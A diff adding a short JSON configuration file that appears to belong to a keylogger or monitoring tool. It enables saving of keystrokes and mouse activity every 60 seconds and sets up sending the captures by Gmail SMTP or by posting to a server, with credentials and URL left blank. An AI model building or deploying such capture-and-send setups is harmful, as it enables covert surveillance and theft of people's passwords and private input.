@@ -1,0 +1,23 @@
+{
+    "keystrokes": {
+        "save": true,
+        "interval": 60
+    },
+
+    "mail": {
+        "email": "",
+        "password": "",
+        "host": "smtp.gmail.com",
+        "port": 465
+    },
+
+    "mouse": {
+        "save": true,
+        "interval": 60
+    },
+
+    "post_to_server": {
+        "url": "",
+        "confirmation": false
+    }
+}
